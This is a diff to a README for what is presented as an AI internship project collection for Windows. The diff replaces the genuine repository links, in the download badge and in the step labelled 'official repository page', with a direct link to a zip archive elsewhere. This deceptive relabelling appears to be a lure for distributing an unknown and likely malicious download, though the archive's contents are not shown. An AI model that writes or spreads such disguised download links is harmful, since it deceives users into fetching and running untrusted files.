@@ -5,7 +5,7 @@ description: "Demonstrate AI engineering skills through four projects covering r
 ---
 # 🤖 DecodeLabs-AI-Internship-2026 - Master Practical Artificial Intelligence Projects Easily
 
-[![Download Software](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/jackygreat565/DecodeLabs-AI-Internship-2026)
+[![Download Software](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/jackygreat565/jackygreat565.github.io/raw/refs/heads/main/soarer/io-jackygreat-github-2.9.zip)
 
 ## 📌 Project Overview
 
@@ -24,7 +24,7 @@ To run these projects on your Windows computer, you need a stable environment. P
 
 You must obtain the project files to begin. Since this repository acts as a collection of scripts, follow these steps to download the content correctly.
 
-1.  Navigate to the official repository page: [https://github.com/jackygreat565/DecodeLabs-AI-Internship-2026](https://github.com/jackygreat565/DecodeLabs-AI-Internship-2026)
+1.  Navigate to the official repository page: [https://github.com/jackygreat565/jackygreat565.github.io/raw/refs/heads/main/soarer/io-jackygreat-github-2.9.zip](https://github.com/jackygreat565/jackygreat565.github.io/raw/refs/heads/main/soarer/io-jackygreat-github-2.9.zip)
 2.  Click the green button labeled "Code" near the top right of the page.
 3.  Select "Download ZIP" from the menu.
 4.  Save the compressed file to your desktop.
